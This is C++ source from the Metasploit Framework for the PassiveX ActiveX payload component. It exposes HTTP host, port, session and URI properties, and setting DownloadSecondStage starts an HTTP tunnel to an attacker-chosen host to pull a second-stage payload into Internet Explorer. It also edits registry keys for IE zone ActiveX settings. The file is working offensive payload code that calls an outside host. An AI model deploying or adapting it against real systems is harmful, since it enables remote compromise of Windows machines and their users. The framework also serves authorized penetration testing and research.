/*
 * This file is part of the Metasploit Exploit Framework
 * and is subject to the same licenses and copyrights as
 * the rest of this package.
 */
#include "PassiveXLib.h"
#include "CPassiveX.h"

#ifdef PXDEBUG
static FILE *DebugFd = NULL;
#endif

CPassiveX::CPassiveX()
: PropHttpPort(0)
{
}

CPassiveX::~CPassiveX()
{
	Tunnel.Stop();

#ifdef PXDEBUG
	if (DebugFd)
		fclose(
				DebugFd);
#endif
}

STDMETHODIMP CPassiveX::InterfaceSupportsErrorInfo(REFIID riid)
{
	if (::InlineIsEqualGUID(IID_IPassiveX, riid))
		return S_OK;

	return S_FALSE;
}

/**************
 * Properties *
 **************/

HRESULT CPassiveX::get_HttpHost(BSTR *Host)
{
	*Host = PropHttpHost;

	return S_OK;
}

HRESULT CPassiveX::put_HttpHost(BSTR Host)
{
	PropHttpHost = Host;

	return S_OK;
}

HRESULT CPassiveX::get_HttpSid(BSTR *Sid)
{
	*Sid = PropHttpSid;

	return S_OK;
}

HRESULT CPassiveX::put_HttpSid(BSTR Sid)
{
	PropHttpSid = Sid;

	return S_OK;
}

HRESULT CPassiveX::get_HttpUriBase(BSTR *UriBase)
{
	*UriBase = PropHttpUriBase;

	return S_OK;
}

HRESULT CPassiveX::put_HttpUriBase(BSTR UriBase)
{
	PropHttpUriBase = UriBase;

	return S_OK;
}

HRESULT CPassiveX::get_HttpPort(ULONG *Port)
{
	*Port = PropHttpPort;

	return S_OK;
}

HRESULT CPassiveX::put_HttpPort(ULONG Port)
{
	PropHttpPort = Port;

	return S_OK;
}

HRESULT CPassiveX::get_DownloadSecondStage(ULONG *Port)
{
	return S_OK;
}

HRESULT CPassiveX::put_DownloadSecondStage(ULONG Port)
{
	Initialize();

	return S_OK;
}

#ifdef PXDEBUG
/*
 * Logs a message to a file for debugging purposes
 */
VOID CPassiveX::Log(LPCTSTR fmt, ...)
{
	// If we haven't opened the debug log yet...
	if (!DebugFd)
	{
		TCHAR DebugFilePath[MAX_PATH];

		ZeroMemory(
				DebugFilePath,
				sizeof(DebugFilePath));

		ExpandEnvironmentStrings(
				TEXT("%TEMP%\\PassiveX.log"),
				DebugFilePath,
				(sizeof(DebugFilePath) / sizeof(TCHAR)) - 1);

		// Try to open the debug log file
		DebugFd = fopen(
				DebugFilePath,
				"a");
	}

	// If we have a valid debug file descriptor...use it
	if (DebugFd)
	{
		va_list Args;

		va_start(
				Args,
				fmt);

#ifndef _UNICODE
		vfprintf(
				DebugFd,
				fmt,
				Args);
#else
		// Lame...
		{
			USES_CONVERSION;

			LPCSTR AsciiString = OLE2A(fmt);

			vfprintf(
					DebugFd,
					AsciiString,
					Args);
		}
#endif

		va_end(
				Args);

		fflush(
				DebugFd);
	}
}
#endif

/*********************
 * Protected Methods *
 *********************/

/*
 * Restores internet explorer zone restrictions to defaults and creates the HTTP
 * tunnel as necessary
 */
VOID CPassiveX::Initialize()
{
	USES_CONVERSION;

	// If the HTTP port is valid, start the HTTP tunnel
	if ((PropHttpHost) &&
	    (PropHttpPort))
	{
		Tunnel.Start(
				OLE2A(PropHttpHost),
				OLE2A(PropHttpUriBase),
				OLE2A(PropHttpSid),
				(USHORT)PropHttpPort);
	}
	
	// Reset zone restrictions back to default
	ResetExplorerZoneRestrictions();
}

/*
 * Resets the internet explorer zone restrictions back to their defaults such
 * that people aren't left vulnerable
 */
VOID CPassiveX::ResetExplorerZoneRestrictions()
{
	ULONG Value;
	HKEY  InternetZoneKey = NULL;

	// Open the internet zone
	if (RegOpenKeyEx(
			HKEY_CURRENT_USER,
			TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3"),
			0,
			KEY_WRITE,
			&InternetZoneKey) == ERROR_SUCCESS)
	{
		// Download unsigned ActiveX controls
		Value = 3; // Disabled

		RegSetValueEx(
				InternetZoneKey,
				TEXT("1004"), 
				0,
				REG_DWORD,
				(LPBYTE)&Value,
				sizeof(Value));

		RegSetValueEx(
				InternetZoneKey,
				TEXT("1201"), 
				0,
				REG_DWORD,
				(LPBYTE)&Value,
				sizeof(Value));

		// Download signed ActiveX controls
		Value = 1; // Prompt

		RegSetValueEx(
				InternetZoneKey,
				TEXT("1001"), 
				0,
				REG_DWORD,
				(LPBYTE)&Value,
				sizeof(Value));

		// Run ActiveX controls and plugins
		Value = 0; // Enabled

		RegSetValueEx(
				InternetZoneKey,
				TEXT("1200"), 
				0,
				REG_DWORD,
				(LPBYTE)&Value,
				sizeof(Value));
	
		// Initialize and script ActiveX controls not marked as safe
		RegCloseKey(
				InternetZoneKey);
	}
}
